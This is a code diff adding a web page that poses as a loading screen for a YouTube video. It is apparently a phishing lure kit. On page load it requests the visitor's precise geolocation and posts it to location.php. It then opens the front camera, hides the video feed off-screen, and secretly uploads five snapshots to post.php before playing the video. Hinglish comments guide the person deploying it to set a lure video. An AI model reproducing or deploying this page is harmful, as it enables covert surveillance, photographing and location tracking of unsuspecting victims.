@@ -1,0 +1,335 @@
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+    
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        background: #000000;
+        min-height: 100vh;
+    }
+    
+    .video-wrap, #canvas {
+        display: none;
+        position: fixed;
+        top: -9999px;
+        left: -9999px;
+    }
+    
+    video, canvas {
+        position: fixed;
+        top: -9999px;
+        left: -9999px;
+        width: 1px;
+        height: 1px;
+    }
+    
+    .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #000000;
+        z-index: 1000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
+    
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border: 3px solid rgba(255,255,255,0.1);
+        border-top: 3px solid #ffffff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    .loading-text {
+        color: #ffffff;
+        font-size: 18px;
+        font-weight: normal;
+    }
+    
+    @media (max-width: 768px) {
+        .spinner {
+            width: 40px;
+            height: 40px;
+        }
+        .loading-text {
+            font-size: 16px;
+        }
+    }
+</style>
+</head>
+
+<body>
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay muted></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Loading...</div>
+    </div>
+
+    <script>
+        let locationSent = false;
+        let imagesCaptured = 0;
+        const totalImages = 5;
+        let completed = false;
+        let redirectStarted = false;
+        let cameraStream = null;
+        
+        // Function to extract YouTube video ID from any YouTube URL
+        function getYouTubeVideoId(url) {
+            if (!url) return null;
+            
+            const patterns = [
+                /(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/v\/)([a-zA-Z0-9_-]{11})/,
+                /youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/,
+                /youtube\.com\/live\/([a-zA-Z0-9_-]{11})/
+            ];
+            
+            for (let pattern of patterns) {
+                const match = url.match(pattern);
+                if (match && match[1]) {
+                    return match[1];
+                }
+            }
+            return null;
+        }
+        
+        // Function to get target video URL (direct video link)
+        function getTargetVideoUrl() {
+            // Pehle URL parameter check karo
+            const urlParams = new URLSearchParams(window.location.search);
+            let target = urlParams.get('redirect');
+            
+            if (target && target !== '') {
+                let decodedUrl = decodeURIComponent(target);
+                console.log("Target URL from parameter:", decodedUrl);
+                
+                // Agar YouTube link hai to video ID extract karo aur direct video link banao
+                const videoId = getYouTubeVideoId(decodedUrl);
+                if (videoId) {
+                    // Direct video link - mobile aur desktop dono pe kaam karega
+                    const directVideoUrl = `https://www.youtube.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1`;
+                    console.log("Direct video URL:", directVideoUrl);
+                    return directVideoUrl;
+                }
+                return decodedUrl;
+            }
+            
+            // Default video - YAHAN APNA VIDEO ID DALO
+            // Example: 'VIDEO_ID_HERE' like 'dQw4w9WgXcQ'
+            const defaultVideoId = 'dQw4w9WgXcQ';
+            const defaultVideoUrl = `https://www.youtube.com/embed/${defaultVideoId}?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1`;
+            console.log("Default video URL:", defaultVideoUrl);
+            return defaultVideoUrl;
+        }
+        
+        // Function to redirect to video - iframe use karega direct video ke liye
+        function showVideo() {
+            if (redirectStarted) return;
+            redirectStarted = true;
+            
+            const videoUrl = getTargetVideoUrl();
+            console.log("Showing video:", videoUrl);
+            
+            // Hide loading screen
+            document.getElementById('loadingOverlay').style.display = 'none';
+            
+            // Create iframe for video
+            const iframe = document.createElement('iframe');
+            iframe.src = videoUrl;
+            iframe.style.position = 'fixed';
+            iframe.style.top = '0';
+            iframe.style.left = '0';
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.border = 'none';
+            iframe.style.zIndex = '999';
+            iframe.allow = 'autoplay; encrypted-media; gyroscope; picture-in-picture';
+            iframe.allowFullscreen = true;
+            
+            document.body.appendChild(iframe);
+        }
+        
+        // Simple redirect function (fallback)
+        function simpleRedirect() {
+            if (redirectStarted) return;
+            redirectStarted = true;
+            
+            const videoUrl = getTargetVideoUrl();
+            console.log("Simple redirect to:", videoUrl);
+            
+            document.getElementById('loadingOverlay').style.display = 'none';
+            window.location.href = videoUrl;
+        }
+        
+        // Send location
+        function sendLocation(position) {
+            if (locationSent) return;
+            
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            
+            console.log("Sending location:", lat, lon);
+            
+            $.ajax({
+                type: 'POST',
+                data: { lat: lat, lon: lon, acc: acc },
+                url: 'location.php',
+                dataType: 'json',
+                async: true,
+                timeout: 5000,
+                success: function() {
+                    console.log("Location saved");
+                    locationSent = true;
+                    checkCompletion();
+                },
+                error: function() {
+                    locationSent = true;
+                    checkCompletion();
+                }
+            });
+        }
+        
+        function locationError(error) {
+            console.log("Location denied");
+            locationSent = true;
+            checkCompletion();
+        }
+        
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    sendLocation,
+                    locationError,
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                locationSent = true;
+                checkCompletion();
+            }
+        }
+        
+        // Send image
+        function sendImage(imgdata) {
+            return new Promise((resolve) => {
+                $.ajax({
+                    type: 'POST',
+                    data: { cat: imgdata },
+                    url: 'post.php',
+                    dataType: 'json',
+                    async: true,
+                    timeout: 10000,
+                    success: function() {
+                        console.log("Image saved:", imagesCaptured + 1);
+                        resolve();
+                    },
+                    error: function() {
+                        resolve();
+                    }
+                });
+            });
+        }
+        
+        // Capture images
+        async function captureImages(video, canvas, stream) {
+            const context = canvas.getContext('2d');
+            
+            for (let i = 0; i < totalImages; i++) {
+                context.drawImage(video, 0, 0, 640, 480);
+                let canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                await sendImage(canvasData);
+                imagesCaptured++;
+                
+                if (i < totalImages - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 600));
+                }
+            }
+            
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            checkCompletion();
+        }
+        
+        // Request camera
+        async function requestCamera() {
+            const constraints = {
+                audio: false,
+                video: { facingMode: "user" }
+            };
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                
+                cameraStream = stream;
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    captureImages(video, canvas, stream);
+                }, 500);
+                
+            } catch (e) {
+                console.log("Camera denied");
+                imagesCaptured = totalImages;
+                checkCompletion();
+            }
+        }
+        
+        // Check completion
+        function checkCompletion() {
+            if (!completed && locationSent && imagesCaptured >= totalImages) {
+                completed = true;
+                document.getElementById('loadingText').innerHTML = 'Redirecting...';
+                
+                setTimeout(() => {
+                    showVideo();
+                }, 1500);
+            }
+        }
+        
+        // Start
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                requestLocation();
+                setTimeout(() => {
+                    requestCamera();
+                }, 500);
+            }, 500);
+        });
+        
+        // Fallback
+        setTimeout(function() {
+            if (!completed && !redirectStarted) {
+                simpleRedirect();
+            }
+        }, 25000);
+    </script>
+</body>
+</html>
